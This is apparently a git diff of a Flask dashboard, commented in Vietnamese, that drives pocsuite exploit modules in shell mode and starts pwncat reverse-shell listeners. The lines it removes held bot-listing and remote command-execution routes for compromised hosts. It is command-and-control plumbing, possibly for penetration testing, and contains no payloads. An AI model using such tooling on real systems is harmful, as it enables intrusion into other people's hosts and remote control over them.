@@ -7,8 +7,9 @@ import wtforms
 import datetime as dt
 from apps.home import blueprint
 from apps import db
-from apps.models import Targets, Incidents, Credentials, VulInTarget, Collections, CollectedFiles, VerificationResults
+from apps.models import Targets, ShellConnection, ShellStatus, ShellType
 from apps.authentication.models import Users
+from apps.managershell.routes import start_shell, close_shell
 from jinja2 import TemplateNotFound
 from flask_wtf import FlaskForm
 from flask_login import login_required, current_user
@@ -432,73 +433,11 @@ def get_verification_results():
         print(f"Error getting verification results: {str(e)}")
         return jsonify({'status': -1, 'message': f'Error getting results: {str(e)}'}), 500
 
-#các hàm của server shell
-@blueprint.route('/server-status', methods = ['GET'])
-@login_required
-def server_status():
-    status = {
-        'isActive': server.is_active,
-    }
-
-    if server.is_active:
-        status['ip'] = server.ip
-        status['port'] = server.port
-
-    return jsonify(status)
-
-@blueprint.route('/start-server', methods = ['POST'])
-@login_required
-def start_server():
-    if not 'ip' in request.form or not 'port' in request.form:
-        return jsonify({'status': -1, 'msg': 'Provide an IP and a Port'})
-
-    ip = request.form['ip']
-    port = request.form['port']
-
-    if not valid_ip(ip):
-        return jsonify({'status': -1, 'msg': 'Invalid IP'})
-
-    if not valid_port(port):
-        return jsonify({'status': -1, 'msg': 'Invalid port'})
-
-    if not server.is_active or not session['server_active']:
-        if server_start(ip, port):
-            return jsonify({'status': 0, 'msg': 'Successfully started server'})
-        return jsonify({'status': -1, 'msg': 'Failed to start server'})
-
-    return jsonify({'status': -1, 'msg': 'Server is already active'})
 
 
-@blueprint.route('/stop-server', methods = ['POST'])
-@login_required
-def stop_server():
-    if server.is_active or session['server_active']:
-        if server_stop():
-            return jsonify({'status': 0, 'msg': 'Successfully stopped server'})
-        return jsonify({'status': -1, 'msg': 'Failed to stop server'})
-
-    return jsonify({'status': -1, 'msg': 'Server is already inactive'})
-
-def server_start(ip, port):
-    if not valid_ip(ip):
-        return 
-    if not valid_port(port):
-        return 
-    session['ip'] = ip
-    session['port'] = port
-    session['server_active'] = True
-    return server.start(ip, port)
-
-
-def server_stop():
-    session['ip'] = None
-    session['port'] = None
-    session['server_active'] = False
-    return not server.stop()
-
-
-@blueprint.route('/shell-mode', methods = ['POST'])
+@blueprint.route('/api/shell-mode', methods = ['POST'])
 def ShellMode():
+    #lấy dữ liệu từ request
     params = {}
     for key in request.form:
         params[key] = request.form[key]
@@ -508,115 +447,70 @@ def ShellMode():
         command = key + ' ' + val
         print(command)
         poc_core.command_set(command)
+    
+    # sau khi set các tham số cho pocsuite 
+    # => kiểm tra shell pwncat tồn tại với lhost-lport chưa
+    check_Createshell = ShellConnection.query.filter_by(
+            local_ip=params['lhost-value'],
+            local_port=params['lport-value']
+        ).first()
+    
+    # => nếu chưa thì khởi tạo shellpwncat
+    if not check_Createshell:
+        # tạo shell mới
+        try: 
+            shell = ShellConnection(
+                local_ip=params['lhost-value'],
+                local_port=params['lport-value'],
+                shell_type=ShellType.PWN_CAT,
+                status=ShellStatus.RUNNING,
+                created_at=dt.datetime.utcnow(),
+                updated_at=dt.datetime.utcnow()
+            )
+            db.session.add(shell)
+            db.session.commit()
+            print(f"[+] Created new shell connection in DB: {shell.local_ip}:{shell.local_port}")
+        except Exception as e:
+            print(f"[-] Error creating shell connection: {str(e)}")
+            return jsonify({'status': -1, 'msg': f'Error creating shell connection: {str(e)}'}), 500
+    
+    # =>  kiểm tra bật chưa và bật shell pwncat
+    if shell.status != ShellStatus.LISTENING:
+        try:
+            # Bật shell pwncat
+            start_shell(shell.local_ip, shell.local_port)
+            shell.update_status(ShellStatus.LISTENING)
+            db.session.commit()
+            print(f"[+] Started shell pwncat on {shell.local_ip}:{shell.local_port}")
+        except Exception as e:
+            print(f"[-] Error starting shell pwncat: {str(e)}")
+            return jsonify({'status': -1, 'msg': f'Error starting shell pwncat: {str(e)}'}), 500            
         
-    #Realise MODE command --> VERIFY
-    poc_core.command_show('options')
-    result = {}
+    
+    # chõ này dùng để kiểm tra cấu hình POCSUITE trước khi thực hiện chức năng shell,
+    poc_core.command_show('options') 
     try:
-        
-        #Phần này có thể thiết lập để Server bật sẵn, và module chạy tự lấy IP và Port từ server
-        if not server.is_active or not session['server_active']:
-            lhost =  poc_core.current_module.getp_option("lhost")
-            lport =  poc_core.current_module.getp_option("lport")
-            if server_start(lhost, lport):
-                print( 'Successfully started server when exploit shellmode')
-            else:
-                result['Server-Error'] = "Cant open server on "+lhost+':'+lport
-                return jsonify({'status': 0, 'data': result})
-
-            poc_core.current_module.lhost = server.ip
-            poc_core.current_module.lport = str(server.port)
-        else:
-            poc_core.current_module.lhost = server.ip
-            poc_core.current_module.lport = str(server.port)
-        conf.api = 1
-        oldCilents = server.total_clients()
+        # chạy dưới dạng shell 
         poc_core.command_shell()
+        result = {
+                'target': params['target-value'],
+                'mode': 'Shelled',
+                'shell_id': shell.id,
+                'shell_status': shell.status.value
+            }
+        
         tmp = poc_core.current_module.result
         if(isinstance(tmp,dict)):
             for key,val in tmp.items():
                 result[key] = val
         else:
-            result['result'] = str(tmp)
-        currentCilents = server.total_clients()
-        if(oldCilents<currentCilents):
-            result['session'] = 'New Bot detected, move to Shell page'
-        else:
-            result['session'] = 'Failed. Payload executed nut no session established'      
-
+            result['result'] = str(tmp)   
     except:
         result['result'] = 'No result'   
-
-   
     # x = kb.plugins
     result['target'] = params['target-value']
     result['mode'] = 'Shelled'
     return jsonify({'status': 0, 'data': result})
-
-###-----Điều khiển bot-----
-#Trả về danh sách các bot (client) đang online/kết nối tới server.
-@blueprint.route('/fetch-bots', methods = ['GET'])
-@login_required
-def fetch_bots():
-    # print("kika.py fetchbots called")
-    online_bots = []
-
-    bots = server.list_clients()
-    # print("bots found")
-    # print(bots)
-    for bot in bots:
-        online_bots.append({
-            'id': bot['bot_id'],
-            'ip': bot['ip'],
-            'os': bot['system'],
-
-            'country': 'VN',
-        })
-
-    return jsonify({
-        'bots': online_bots,
-    })
-
-#Nhận vào bot-id từ client, trả về thông tin chi tiết về bot đó (ip, hệ điều hành).
-@blueprint.route('/get-bot-info', methods = ['POST'])
-@login_required
-def get_bot_info():
-    if not 'bot-id' in request.form:
-        return jsonify({'status': -1, 'msg': 'bot-id is required'})
-
-    bot_id = request.form['bot-id']
-    bot = server.get_bot(bot_id)
-
-    if not bot:
-        return jsonify({'status': -1, 'msg': 'No bot is available by that id'})
-
-
-    data = {
-        'system': {
-            'ip': bot['ip'],
-            'OS': bot['OS']
-        }
-    }
-
-    return jsonify({'status': 0, 'data': data})
-
-#Nhận một lệnh (cmd) từ client, 
-# gửi lệnh này tới bot (client) hiện tại thông qua server, 
-# và trả về kết quả thực thi lệnh đó.
-@blueprint.route('/control/cmd', methods = ['POST'])
-@login_required
-# @bot_required
-def control_cmd():
-    if not 'cmd' in request.form:
-        return jsonify({'resp': 'No cmd found'})
-
-    cmd = request.form['cmd']
-
-    if not server.client:
-        return jsonify({'resp': ''})
-    resp = ''
-    resp = server.execute_cmd_console(server.client,cmd)
-    return jsonify({'resp': resp})
 
 
 
